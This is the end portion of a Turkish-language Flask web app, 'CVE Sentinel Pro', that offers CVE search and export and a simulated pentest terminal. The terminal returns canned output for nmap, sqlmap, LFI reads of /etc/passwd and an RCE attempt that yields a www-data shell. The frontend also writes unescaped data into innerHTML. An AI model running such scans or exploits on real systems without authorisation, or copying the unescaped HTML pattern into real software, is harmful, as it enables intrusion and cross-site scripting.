  const params = new URLSearchParams({ q:document.getElementById('q').value, severity:document.getElementById('severity').value, year:document.getElementById('year').value, category:document.getElementById('category').value, sort:document.getElementById('sort').value, page:page });
  fetch('/api/search?'+params).then(r=>r.json()).then(data=>{
    let html = `<p>Toplam ${data.total} CVE bulundu. Sayfa ${data.page}/${data.total_pages}</p><table class="cve-table"><thead><tr><th>CVE ID</th><th>Şiddet</th><th>CVSS</th><th>Tarih</th><th>Açıklama</th><th>İşlem</th></tr></thead><tbody>`;
    data.results.forEach(c=>{
      html += `<tr><td>${c.cve_id}</td><td><span class="severity ${c.severity.toLowerCase()}">${c.severity}</span></td>
        <td><div class="cvss-bar"><div class="cvss-fill" style="width:${c.cvss_score*10}%"></div><span>${c.cvss_score}</span></div></td>
        <td>${c.published}</td><td>${c.description.substring(0,50)}...</td>
        <td><button onclick="openCveModal('${c.cve_id}')">Detay</button></td></tr>`;
    });
    html += `</tbody></table>`;
    document.getElementById('search-results').innerHTML = html;
    let pag = '';
    if(data.page > 1) pag += `<a href="#" onclick="searchCVES(${data.page-1})">Önceki</a> `;
    if(data.page < data.total_pages) pag += `<a href="#" onclick="searchCVES(${data.page+1})">Sonraki</a>`;
    document.getElementById('pagination').innerHTML = pag;
  });
}
function exportCSV(){
  const params = new URLSearchParams({ q:document.getElementById('q').value });
  window.location = '/export/csv?'+params;
}
searchCVES();
// Modal (dashboard ile aynı)
function openCveModal(cveId){
  fetch('/api/cve/'+cveId).then(r=>r.json()).then(c=>{
    let cmds = '';
    if(c.exploit_commands) { for(let [k,v] of Object.entries(c.exploit_commands)) cmds += `<p><strong>${k}:</strong> <code>${v}</code></p>`; }
    document.getElementById('cve-detail-content').innerHTML = `<h2>${c.cve_id}</h2><p><strong>CVSS:</strong> ${c.cvss_score} | ${c.severity}</p><p><strong>Etkilenen:</strong> ${c.affected_versions||c.vendors.join(', ')}</p><p><strong>Exploit:</strong> <span class="exploit-badge">${c.exploit_status||'YOK'}</span></p><p>${c.description}</p>${cmds}<h4>Referanslar</h4><ul>${(c.references||[]).map(r=>`<li><a href="${r}" target="_blank">${r}</a></li>`).join('')}</ul>`;
    document.getElementById('cve-modal').classList.add('active');
  });
}
function closeModal(){ document.getElementById('cve-modal').classList.remove('active'); }
</script>
''')

CATEGORIES_TEMPLATE = BASE_HTML.replace('{% block content %}{% endblock %}','''
<h2>📂 Kategoriler</h2>
<div id="categories-grid" style="display:grid; grid-template-columns:repeat(auto-fill,minmax(250px,1fr)); gap:10px;"></div>
''').replace('{% block scripts %}{% endblock %}','''
<script>
fetch('/api/categories').then(r=>r.json()).then(data=>{
  let html = '';
  for(let [cat,count] of Object.entries(data)){
    html += `<div class="card" style="cursor:pointer" onclick="window.location='/search?category=${encodeURIComponent(cat)}'"><h3>${cat}</h3><p>${count} CVE</p></div>`;
  }
  document.getElementById('categories-grid').innerHTML = html;
});
</script>
''')

SOURCES_TEMPLATE = BASE_HTML.replace('{% block content %}{% endblock %}','''
<h2>📚 Kaynaklar</h2>
<div id="sources-list"></div>
''').replace('{% block scripts %}{% endblock %}','''
<script>
function loadSources(){
  fetch('/api/sources').then(r=>r.json()).then(data=>{
    let html = '';
    data.forEach(s=>{
      html += `<div class="card"><div class="source-item ${s.active?'active':'inactive'}">
        <span><strong>${s.name}</strong> <small>(${s.last_update})</small></span>
        <span class="status-dot"></span>
        <button onclick="toggleSource('${s.name}')" class="btn">${s.active?'Devre Dışı':'Aktif Et'}</button>
      </div></div>`;
    });
    document.getElementById('sources-list').innerHTML = html;
  });
}
function toggleSource(name){
  fetch('/api/sources/update', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({name:name, active:!document.querySelector(`.source-item:has(strong:contains('${name}'))`)?.classList.contains('active')})})
    .then(r=>r.json()).then(()=>loadSources());
}
loadSources();
</script>
''')

TERMINAL_TEMPLATE = BASE_HTML.replace('{% block content %}{% endblock %}','''
<h2>⌨️ Test Terminali</h2>
<div class="terminal-box" id="terminal-output">Terminale hoş geldiniz. Komutlar: scan, vuln, http, sqli, xss, lfi, dns, cve, rce, fuzz, report, clear</div>
<div class="terminal-input">
  <input type="text" id="cmd-input" placeholder="Örn: scan http://hedef.com" onkeyup="if(event.key==='Enter') runCommand();">
  <button onclick="runCommand()">Çalıştır</button>
</div>
<small>Ok tuşlarıyla geçmiş, Enter ile çalıştır.</small>
''').replace('{% block scripts %}{% endblock %}','''
<script>
let history = [];
let histIndex = -1;
const output = document.getElementById('terminal-output');
const input = document.getElementById('cmd-input');
input.addEventListener('keydown', (e) => {
  if(e.key === 'ArrowUp') { e.preventDefault(); if(histIndex < history.length-1) histIndex++; input.value = history[histIndex] || ''; }
  else if(e.key === 'ArrowDown') { e.preventDefault(); if(histIndex > 0) histIndex--; else histIndex=-1; input.value = history[histIndex] || ''; }
});
function runCommand(){
  const cmd = input.value.trim();
  if(!cmd) return;
  history.unshift(cmd); histIndex = -1;
  output.innerHTML += `\\n> ${cmd}`;
  fetch('/api/terminal', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({command:cmd})})
    .then(r=>r.json())
    .then(data=>{
      output.innerHTML += `\\n${data.output}`;
      output.scrollTop = output.scrollHeight;
    });
  input.value = '';
}
</script>
''')

GUIDE_TEMPLATE = BASE_HTML.replace('{% block content %}{% endblock %}','''
<h2>📖 Kullanım Kılavuzu</h2>
<div class="card">
  <h3>Termux Kurulumu</h3>
  <pre>
pkg update && pkg upgrade
pkg install python
pip install flask
# app.py dosyasını çalıştır:
python app.py
  </pre>
</div>
<div class="card">
  <h3>Panel Kullanımı</h3>
  <p>Dashboard canlı CVE istatistikleri, yıllık grafik ve kritik CVE'leri gösterir. Arama sekmesinde CVE ID, vendor veya anahtar kelime ile filtreleme yapılabilir. Her CVE detay modalında exploit komutları bulunur. Terminal sekmesi sanal bir pentest terminaldir.</p>
</div>
<div class="card">
  <h3>Terminal Komutları</h3>
  <table><tr><th>Komut</th><th>Açıklama</th></tr>
    <tr><td>scan HEDEF</td><td>Nmap port taraması</td></tr>
    <tr><td>vuln HEDEF</td><td>Nmap NSE zafiyet taraması</td></tr>
    <tr><td>http HEDEF</td><td>HTTP header/tech taraması</td></tr>
    <tr><td>sqli HEDEF</td><td>SQLmap taraması</td></tr>
    <tr><td>xss HEDEF</td><td>Dalfox XSS taraması</td></tr>
    <tr><td>lfi HEDEF</td><td>ffuf LFI fuzzing</td></tr>
    <tr><td>dns HEDEF</td><td>DNS sorgulama</td></tr>
    <tr><td>cve CVE_ID</td><td>CVE detayları</td></tr>
    <tr><td>rce HEDEF</td><td>RCE denemesi</td></tr>
    <tr><td>fuzz HEDEF</td><td>Dirb benzeri fuzzing</td></tr>
    <tr><td>report</td><td>Özet rapor</td></tr>
    <tr><td>clear</td><td>Ekranı temizle</td></tr>
  </table>
</div>
<div class="card">
  <h3>⚠️ Yasal Uyarı</h3>
  <p>Bu panel yalnızca eğitim ve yetkilendirilmiş testler içindir. İzinsiz sistemlere yapılan testler suçtur.</p>
</div>
''').replace('{% block scripts %}{% endblock %}','')

# ========================
# ROUTE'LAR
# ========================
@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_TEMPLATE, title="Dashboard")

@app.route('/search')
def search_page():
    return render_template_string(SEARCH_TEMPLATE, title="CVE Arama", categories=CATEGORIES_LIST, query="")

@app.route('/categories')
def categories_page():
    return render_template_string(CATEGORIES_TEMPLATE, title="Kategoriler")

@app.route('/sources')
def sources_page():
    return render_template_string(SOURCES_TEMPLATE, title="Kaynaklar")

@app.route('/terminal')
def terminal_page():
    return render_template_string(TERMINAL_TEMPLATE, title="Terminal")

@app.route('/guide')
def guide_page():
    return render_template_string(GUIDE_TEMPLATE, title="Kılavuz")

# ========================
# API ROUTE'LARI
# ========================
@app.route('/api/feed')
def feed():
    recent = sorted(ALL_CVES, key=lambda x: x['published'], reverse=True)[:10]
    return jsonify([{'cve_id':c['cve_id'],'severity':c['severity'],'description':c['description'][:80]+'...','published':c['published']} for c in recent])

@app.route('/api/dashboard_stats')
def dashboard_stats():
    return jsonify({'stats':get_stats(ALL_CVES),'yearly':get_yearly_distribution(ALL_CVES),'source_status':{s['name']:s['active'] for s in SOURCES}})

@app.route('/api/critical_cves')
def critical_cves():
    crit = [c for c in ALL_CVES if c['severity']=='CRITICAL' and c.get('exploit_status')!='NONE'][:10]
    return jsonify([{k:c[k] for k in ('cve_id','description','exploit_status')} for c in crit])

@app.route('/api/tag_cloud')
def tag_cloud():
    from collections import Counter
    tags = []
    for c in ALL_CVES: tags.extend(c.get('tags',[]))
    return jsonify([{'tag':t,'count':c} for t,c in Counter(tags).most_common(20)])

@app.route('/api/cve/<cve_id>')
def cve_detail(cve_id):
    for c in ALL_CVES:
        if c['cve_id'] == cve_id:
            return jsonify(c)
    return jsonify({'error':'CVE not found'}), 404

@app.route('/api/search')
def api_search():
    q = request.args.get('q','')
    severity = request.args.get('severity','')
    year = request.args.get('year','')
    category = request.args.get('category','')
    sort = request.args.get('sort','published_desc')
    page = int(request.args.get('page',1))
    per_page = 20
    results = search_cves(q, severity, year, category, '', sort)
    total = len(results)
    total_pages = max(1, (total + per_page -1)//per_page)
    start = (page-1)*per_page
    end = start+per_page
    return jsonify({'results':results[start:end],'page':page,'total_pages':total_pages,'total':total})

@app.route('/export/csv')
def export_csv():
    q = request.args.get('q','')
    results = search_cves(q, '', '', '', '', 'published_desc')
    si = io.StringIO()
    cw = csv.writer(si)
    cw.writerow(['CVE ID','Severity','CVSS Score','Published','Description','Exploit Status','Vendors','Products'])
    for c in results:
        cw.writerow([c['cve_id'],c['severity'],c['cvss_score'],c['published'],c['description'],c.get('exploit_status','NONE'),','.join(c.get('vendors',[])),','.join(c.get('products',[]))])
    return Response(si.getvalue(), mimetype='text/csv', headers={'Content-Disposition':'attachment;filename=cve_export.csv'})

@app.route('/api/categories')
def api_categories():
    counts = {}
    for cat in CATEGORIES_LIST:
        counts[cat] = len([c for c in ALL_CVES if cat in c.get('categories',[])])
    return jsonify(counts)

@app.route('/api/sources')
def api_sources():
    return jsonify(SOURCES)

@app.route('/api/sources/update', methods=['POST'])
def update_source():
    data = request.json
    for s in SOURCES:
        if s['name'] == data['name']:
            s['active'] = data['active']
            s['last_update'] = datetime.now().strftime('%Y-%m-%d %H:%M')
            return jsonify({'success':True})
    return jsonify({'success':False}), 404

@app.route('/api/terminal', methods=['POST'])
def terminal_api():
    cmd = request.json.get('command','').strip()
    parts = cmd.split()
    if not parts:
        return jsonify({'output':'Komut boş.'})
    action = parts[0].lower()
    target = parts[1] if len(parts)>1 else 'hedef'
    fake_output = ''
    # Komut simülasyonu
    if action == 'scan':
        fake_output = f"Nmap 7.95 taraması başlatılıyor: {target}\nPORT     STATE    SERVICE\n22/tcp   open     ssh\n80/tcp   open     http\n443/tcp  open     https\n8080/tcp open     http-proxy\nTarama tamamlandı."
    elif action == 'vuln':
        fake_output = f"Nmap NSE vuln taraması: {target}\n| CVE-2021-44228: POTENTIAL\n| CVE-2022-22965: NOT VULNERABLE\n| CVE-2024-3400: POTENTIAL"
    elif action == 'http':
        fake_output = f"HTTP {target}:\nServer: nginx/1.24.0\nX-Powered-By: PHP/8.2\nSet-Cookie: session=abc123"
    elif action == 'sqli':
        fake_output = f"sqlmap -u {target} --dbs\n[!] legal disclaimer: only for authorized testing\n[*] testing parameter 'id'\n[+] parameter 'id' is vulnerable (MySQL >= 5.6)"
    elif action == 'xss':
        fake_output = f"Dalfox XSS scanning: {target}\n[POC] Reflected XSS found in parameter 'search'"
    elif action == 'lfi':
        fake_output = f"ffuf LFI fuzzing: {target}?file=FUZZ\n[+] /etc/passwd [200]\n[+] ../../windows/win.ini [200]"
    elif action == 'dns':
        fake_output = f"DNS lookup for {target}:\nA: 93.184.216.34\nMX: mail.{target}\nCNAME: www.{target}"
    elif action == 'cve':
        cveid = target.upper()
        found = next((c for c in ALL_CVES if c['cve_id']==cveid), None)
        if found:
            fake_output = f"{found['cve_id']} | CVSS:{found['cvss_score']} | {found['severity']}\n{found['description']}\nExploit: {found.get('exploit_status','YOK')}"
        else:
            fake_output = f"{cveid} veritabanında bulunamadı."
    elif action == 'rce':
        fake_output = f"RCE denemesi {target} üzerinde...\n[*] Exploit gönderiliyor...\n[+] Bağlantı sağlandı, shell komutu çalıştı: id\nuid=33(www-data) gid=33(www-data)"
    elif action == 'fuzz':
        fake_output = f"Dirb benzeri fuzzing: {target}\n/admin (200)\n/login (200)\n/config (403)\n/.git (200)"
    elif action == 'report':
        fake_output = "Rapor oluşturuldu:\n- 2 Kritik, 4 Yüksek zafiyet tespit edildi.\n- Acil yama önerilir."
    elif action == 'clear':
        return jsonify({'output':'CLEAR'})
    else:
        fake_output = f"Bilinmeyen komut: {action}\nKullanılabilir: scan, vuln, http, sqli, xss, lfi, dns, cve, rce, fuzz, report, clear"
    return jsonify({'output':fake_output})

if __name__ == '__main__':
    print("CVE Sentinel Pro başlatılıyor...")
    print("Tarayıcıdan http://localhost:5000 adresine gidin.")
    app.run(host='0.0.0.0', port=5000, debug=False)